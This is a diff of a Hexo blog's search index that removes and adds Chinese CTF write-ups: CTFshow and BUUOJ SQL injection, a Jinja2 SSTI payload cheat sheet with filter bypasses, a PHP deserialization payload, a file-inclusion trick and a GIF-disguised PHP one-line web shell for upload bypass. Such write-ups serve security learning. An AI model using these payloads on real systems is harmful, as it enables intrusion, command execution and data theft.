-<p>4、最后直接上传发布博客就好了</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-<p>注意：hexo在5.0之后把swig给删除了，需要自己手动安装，不然安装next主题后会显示错误<br>输入下面这串代码安装</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
-<p>然后hexo c清理缓存，hexo g &amp; s即可。</p>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>全部的搭建步骤已经讲完了，写篇博客其实只是为了记录一下自己学习的搭建过程，如果对你有帮助的话，可以分享给你的朋友哦(￣▽￣)”</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>next</tag>
       </tags>
   </entry>
   <entry>
@@ -402,178 +353,8 @@
         <category>sql注入</category>
       </categories>
       <tags>
+        <tag>sql注入</tag>
         <tag>mysql</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTFshow web入门 sql</title>
-    <url>/2021/02/09/sql/CTF%20show%20web%E5%85%A5%E9%97%A8%20sql/</url>
-    <content><![CDATA[<p>CTFshow web入门 sql注入</p>
-<a id="more"></a>
-<h1 id="sql171"><a href="#sql171" class="headerlink" title="sql171"></a>sql171</h1><p>已给出提示：</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
-<p>首先判断注入点</p>
-</blockquote>
-<blockquote>
-<p>id=1’ and 1=1</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/14a98fd34b12ede5b79837c8cb71cee6.png" alt="1"></p>
-<p>没报错也没有显示任何信息，将1=1改为1=2</p>
-<blockquote>
-<p>id=1’ and 1=2</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/6618d1687fc6391b7fab913fa7304d6f.png" alt="2"></p>
-<p>还是没有显示任何信息，说明可以使用 ‘ 字符注入</p>
-<p>然后开始判断表有多少列</p>
-<blockquote>
-<p>id=1’ order by 1,2,3 –+</p>
-</blockquote>
-<p>没反应</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/baa7fb6b509789bd13a55341b5ed2ead.png" alt="3"></p>
-<blockquote>
-<p>id=1’ order by 1,2,3,4 –+</p>
-</blockquote>
-<p>出现异常，说明只有三列</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/395e1e2c8fdbcc279cb5cdd97dc5fff3.png" alt="4"></p>
-<p>查询用户，数据库</p>
-<blockquote>
-<p>id=1’ union select 1,user(),database() –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/c082ec58008ebb62f2ad28c500341d79.png" alt="5"></p>
-<p>查询该数据库下有哪些表</p>
-<blockquote>
-<p>id=1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’ctfshow_web’),3 –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/44d780e1a497be20a272bf6ad71e0a67.png" alt="6"></p>
-<p>知道表名就可以查询表里的内容了</p>
-<blockquote>
-<p>id=1’ union select id,username,password from ctfshow_user –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/c4aac8c93bb0e44d7dcd3cc474e7da1a.png" alt="7"></p>
-<p>w_user –+</p>
-<p>[外链图片转存中…(img-4ECGGwnL-1612801653075)]</p>
-<p>拿到flag</p>
-<h1 id="sql172"><a href="#sql172" class="headerlink" title="sql172"></a>sql172</h1><p>进入题目后已给出查询语句</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>于是根据查询语句构造payload</p>
-<blockquote>
-<p>-1” ‘ union select 1,2,3 –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210209003048217.png">接着查询表名</p>
-<blockquote>
-<p>-1” ‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3 –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/2021020900314130.png"><br>然后查询表中的数据，先查询ctfshow_user</p>
-<blockquote>
-<p>-1” ‘ union select id,username,password from ctfshow_user –+</p>
-</blockquote>
-<p>发现flag不在这里</p>
-<p><img src="https://img-blog.csdnimg.cn/20210209003423518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后查询ctfshow_user2</p>
-<blockquote>
-<p>-1” ‘ union select id,username,password from ctfshow_user2 –+</p>
-</blockquote>
-<p>发现flag<br><img src="https://img-blog.csdnimg.cn/2021020900351314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="sql173"><a href="#sql173" class="headerlink" title="sql173"></a>sql173</h1><p>根据题目给出的查询语句和返回逻辑发现，题目对id,username,password都进行了正则匹配<br>查询资料发现可以通过hex绕过</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>payload</p>
-<blockquote>
-<p>-1” ‘ union select hex(id),hex(username),hex(password) from ctfshow_user3 where username=’flag’ –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210209005644675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>将获取的结果进行十六进制解码可以得到flag<br><img src="https://img-blog.csdnimg.cn/2021020900572493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>模板注入(SSTI)的简单总结</title>
-    <url>/2021/03/26/web%E5%AD%A6%E4%B9%A0/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="模板注入-SSTI-的简单总结"><a href="#模板注入-SSTI-的简单总结" class="headerlink" title="模板注入(SSTI)的简单总结"></a>模板注入(SSTI)的简单总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于现在还是萌新时期，这时候决定先写一篇关于模板注入的简单总结给自己用。</p>
-<h2 id="SSTI的简单测试"><a href="#SSTI的简单测试" class="headerlink" title="SSTI的简单测试"></a>SSTI的简单测试</h2><p><img src="https://i.loli.net/2021/03/25/uwZaFe4Tx8MR6DG.png"></p>
-<h2 id="各框架的模板结构"><a href="#各框架的模板结构" class="headerlink" title="各框架的模板结构"></a>各框架的模板结构</h2><p><img src="https://i.loli.net/2021/03/25/fRsgd7tD6mQNHyB.png"></p>
-<h2 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>在缺省情况下，以下全局变量可以在 Jinja2 模板中使用：</p>
-<ul>
-<li><p><code>config</code></p>
-<p>当前配置对象（ <code>flask.config</code> ）tips：这个变量总是可用，甚至是在被导入的模板中。</p>
-</li>
-<li><p><code>request</code></p>
-<p>当前请求对象（ <code>flask.request</code> ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p>
-</li>
-<li><p><code>session</code></p>
-<p>当前会话对象（ <code>flask.session</code> ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p>
-</li>
-<li><p><code>g</code></p>
-<p>请求绑定的全局变量（ <code>flask.g</code>）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p>
-</li>
-<li><p><code>url_for()</code></p>
-<p><code>flask.url_for()</code>函数。</p>
-</li>
-<li><p><code>get_flashed_messages()</code></p>
-<p><code>flask.get_flashed_messages()</code> 函数。</p>
-</li>
-</ul>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>在python的SSTI中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti。</p>
-<ul>
-<li><code>__class__</code></li>
-</ul>
-<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
-<ul>
-<li><code>__bases__</code></li>
-</ul>
-<p>以元组的形式返回一个类所直接继承的类。</p>
-<ul>
-<li><code>__mro__</code></li>
-</ul>
-<p>返回解析方法调用的顺序。</p>
-<ul>
-<li><code>__subclasses__()</code></li>
-</ul>
-<p>获取类的所有子类。</p>
-<ul>
-<li><code>__init__</code></li>
-</ul>
-<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
-<ul>
-<li><code>__globals__</code></li>
-</ul>
-<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
-<h3 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;cat /fl4g|base64&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
-<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="测试SSTI过滤"><a href="#测试SSTI过滤" class="headerlink" title="测试SSTI过滤"></a>测试SSTI过滤</h4><p><code>&#123;&#123;"要测试的字符"&#125;&#125;</code>，只需要看看要测试的字符是否返回在页面中即可，下面分别说说对应各种过滤情况的解决办法。</p>
-<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤 "></a>过滤 </h4><p>使用<code>&#123;%`进行绕过，`&#123;%%&#125;</code>中间执行if语句可以起到类似盲注的效果</p>
-<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><p>可以用编码绕过</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#如下</span></span><br><span class="line">__class__ =&gt; &#x27;\x5f\x5fclass\x5f\x5f&#x27;</span><br></pre></td></tr></table></figure>
-<p><code>_</code> =&gt; <code>\x5f</code> ， <code>.</code> =&gt; <code>\x2e</code></p>
-<p>过滤了_可以用<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]绕过</code></p>
-<p>如果过滤了<code>args</code>也可以<code>request[&#39;values&#39;]</code>结合<code>attr()</code>绕过</p>
-<p>如：<code>&#39;&#39;.__class__</code> 可以写成 <code>&#39;&#39;|attr(request[&#39;values&#39;][&#39;x1&#39;])</code>，然后POST传入<code>x1=__class__</code></p>
-<h4 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤."></a>过滤<code>.</code></h4><p>可以用<code>attr()</code>或<code>[]</code>绕过</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例如</span></span><br><span class="line"><span class="comment"># 正常的payload</span></span><br><span class="line">url?name=&#123;&#123;().__class__.__base__.__subclasses__[177].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ipconfig&quot;).read()&#x27;)&#125;&#125;`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用attr()绕过</span></span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">177</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用[]绕过</span></span><br><span class="line">url?name=&#123;&#123; config[&#x27;__class__&#x27;][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ipconfig&#x27;)[&#x27;read&#x27;]() &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># tips：</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__ 可以写成 <span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>) 或者 <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="过滤-3"><a href="#过滤-3" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><p>可以使用<code>getitem()</code>来获取序号</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[2] =&gt;</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="利用请求方式requests绕过"><a href="#利用请求方式requests绕过" class="headerlink" title="利用请求方式requests绕过"></a>利用请求方式requests绕过</h4><p>对于某些较为严格的过滤，我们可以选着用<code>requests</code>的方式绕过</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例如</span></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request.args.t1]&#125;&#125;&amp;t1=__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 又或者</span></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request[&#x27;args&#x27;][&#x27;t1&#x27;]]&#125;&#125;&amp;t1=__class__</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161669108716780271543102%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161669108716780271543102&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&amp;utm_term=%E6%A8%A1%E6%9D%BF">https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161669108716780271543102%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161669108716780271543102&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&amp;utm_term=%E6%A8%A1%E6%9D%BF</a></p>
-<p><a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a></p>
-]]></content>
-      <categories>
-        <category>Web学习</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Web</tag>
-        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -585,8 +366,8 @@
         <category>sql注入</category>
       </categories>
       <tags>
-        <tag>mysql</tag>
         <tag>sql注入</tag>
+        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -747,6 +528,327 @@
       </categories>
       <tags>
         <tag>other</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUOJ-Web-1pts</title>
+    <url>/2021/03/11/WriteUp/BUUOJ%20web%201pts/</url>
+    <content><![CDATA[<p>BUUOJ-Web WriteUp</p>
+<a id="more"></a>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单的sql注入</p>
+<p>这里是payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>可以登陆进去之后直接看到flag</p>
+<p><img src="https://i.loli.net/2021/03/11/4BYLC9cDZv7ztT2.png"></p>
+<blockquote>
+<p>flag{2c793226-369d-4941-af62-10463af21b6c}</p>
+</blockquote>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>尝试了各种姿势后发现可以用堆叠注入</p>
+<p>爆库名</p>
+<blockquote>
+<p>1’;show databases;#</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/03/11/oBOT9y7iNzrgacA.png"></p>
+<p>爆表名</p>
+<blockquote>
+<p>1’;show tables;#</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/03/11/A7j2dthgLny8iQC.png"></p>
+<p>爆列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;# #爆1919810931114514表</span><br><span class="line">1&#39;;show columns from &#96;words&#96;;# #爆words表</span><br></pre></td></tr></table></figure>
+<p>发现id在words表中，那么咱只需要改个表名就行了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;; # 把表words更名为words1</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; # 把表1919810931114514更名为words</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100); # 把words中的列名flag更名为id</span><br></pre></td></tr></table></figure>
+<p>然后只要登入就可以看到flag了</p>
+<blockquote>
+<p>1’ or 1=1 #</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/03/11/S1cdzKsJLBnDA5P.png"></p>
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开看见一只可爱的小猫</p>
+<p>直接进入ctrl + U看源代码，在下面发现藏东西了</p>
+<p><img src="https://i.loli.net/2021/03/11/pYXv52zRePSgiOu.png"></p>
+<p>按着GET一个cat变量，出现flag</p>
+<p><img src="https://i.loli.net/2021/03/11/4sCJkcIQWBzdv9p.png"></p>
+<blockquote>
+<p>flag{04dfe2f2-bbf0-43f3-9bf1-faab0790de78}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>ctrl+U发现一个Archive_room.php</p>
+<p>用burpsuite抓一下包，发现一个secr3t.php</p>
+<p><img src="https://i.loli.net/2021/03/13/2pXDMTH8ZsvziE4.png"></p>
+<p>发现是一段简单的代码审计和文件包含</p>
+<p>咱可以用伪协议</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/03/13/gCqDYKie7H3RVP2.png"></p>
+<p>得到一串base64编码，解码即可得到flag</p>
+<blockquote>
+<p>flag{d67ab513-7a2d-4e45-a27a-99486f6f99ee}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>进去后发现是简单的sql注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,3 # # 查看回显</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 # #爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;),3 # # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(concat_ws(0x7e, username, password)) from l0ve1ysq1),3 # #爆数据</span><br></pre></td></tr></table></figure>
+<p>最后得到flag</p>
+<blockquote>
+<p>flag{94e175f4-807f-404e-a433-65501ae8595b}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>这题提示已经POST了一个一句话木马</p>
+<p>直接用蚁剑连接</p>
+<p><img src="https://i.loli.net/2021/03/13/KYiDsjup9zoFG7b.png"></p>
+<p>  得到flag</p>
+<blockquote>
+<p>flag{46dce079-289a-4494-98da-139ce0e08a9a}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p> ctrl+U发现一个secret.php</p>
+<p>进入后依照提示逐一添加header</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure>
+<p>即可得到flag</p>
+<blockquote>
+<p>flag{da768d87-8706-4596-bf42-71c1b8fa6453}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>有提示可以知道有网站备份文件</p>
+<p>运用脚本进行扫描</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://bb232cbc-9635-4f1f-bbdb-d01f82b431ee.node3.buuoj.cn/&#x27;</span>		<span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        print(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure>
+<p>得到一个<a href="http://www.zip/">www.zip</a></p>
+<p>发现是一道php反序列化绕过，这里简化了一下代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据代码构造payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后用python提交get，成功得到flag（虽然不知道为啥Hackbar提交没反应</p>
+<blockquote>
+<p>flag{361e4af6-f242-4f37-888e-17491b76ecd2}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>进入发现需要上传文件，构造一个一句话木马扔上去</p>
+<p>用burpsuites抓包改一下文件类型</p>
+<p>然后提示不能包含&lt;?字符，去度娘搜了一下之后发现可以在文件头部加上**GIF89a?**绕过这个点</p>
+<p>然后又提示不能用php类型文件</p>
+<p>一番查找了之后发现了一个.phtml类型</p>
+<p>重新构造了一下木马</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;rossweisse&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>用菜刀链接即可得到flag</p>
+<blockquote>
+<p>flag{43921141-5d8f-4c88-b07c-55b0801220ca}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题也是一道sql注入题</p>
+<p>按照原来的套路试了几次之后发现把关键字都ban了</p>
+<p>那么我们可双写关键字来进行绕过</p>
